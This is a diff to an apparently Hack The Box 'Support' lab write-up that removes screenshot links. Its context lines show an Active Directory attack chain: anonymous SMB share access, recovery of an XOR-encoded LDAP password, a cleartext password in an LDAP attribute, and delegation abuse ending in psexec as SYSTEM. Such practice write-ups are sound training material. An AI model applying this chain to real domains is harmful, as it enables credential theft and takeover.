@@ -32,8 +32,6 @@ nmap -p53,88,135,139,389,445,464,636,3268,5985 -sCV <target>
 A standard Domain Controller footprint (DNS, Kerberos, LDAP, SMB, WinRM). Add
 `support.htb` and `dc.support.htb` to `/etc/hosts`.
 
-![Nmap scan of the Domain Controller](../images/support-01-nmap.png)
-
 ### SMB — anonymous share
 
 ```bash
@@ -48,8 +46,6 @@ The `support-tools` share is readable anonymously and contains several utilities
 smb: \> get UserInfo.exe.zip
 unzip UserInfo.exe.zip
 ```
-
-![Anonymous listing and download from the support-tools share](../images/support-02-smb-share.png)
 
 ---
 
@@ -71,8 +67,6 @@ key          = "armando";                          // XOR key
 Decode it (e.g. with a short Python/CyberChef recipe) to recover the LDAP bind password for
 `ldap@support.htb`.
 
-![dnSpy showing the XOR/base64 password-recovery routine](../images/support-03-dnspy-ldap-password.png)
-
 ### LDAP → support account password
 
 Use the recovered `ldap` credentials to read the directory. The `support` user object hides a
@@ -84,8 +78,6 @@ ldapsearch -x -H ldap://dc.support.htb -D 'support\ldap' -w '<ldap-pass>' \
 # ...
 # info: <support-user-cleartext-password>
 ```
-
-![ldapsearch revealing the password in the support user's info attribute](../images/support-04-ldap-info-attr.png)
 
 Confirm and grab the user flag over WinRM:
 
@@ -136,8 +128,6 @@ attack:
    ```bash
    psexec.py -k -no-pass dc.support.htb
    ```
-
-![RBCD chain: addcomputer → rbcd → getST → psexec as SYSTEM](../images/support-05-rbcd-system.png)
 
 ```
 C:\> whoami
